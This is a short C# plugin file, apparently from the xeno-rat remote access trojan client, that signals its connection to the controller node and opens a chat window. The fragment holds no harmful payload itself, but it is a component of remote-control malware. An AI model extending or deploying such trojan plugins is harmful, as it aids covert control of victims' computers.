using Chat;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Sends a byte array to the specified node and then runs the ChatForm application.
        /// </summary>
        /// <param name="node">The node to which the byte array is sent.</param>
        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="node"/> is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array to the specified <paramref name="node"/> to indicate that it has connected, and then runs the ChatForm application.
        /// </remarks>
        public async Task Run(Node node) 
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            Application.Run(new ChatForm(node));
        }
    }
}
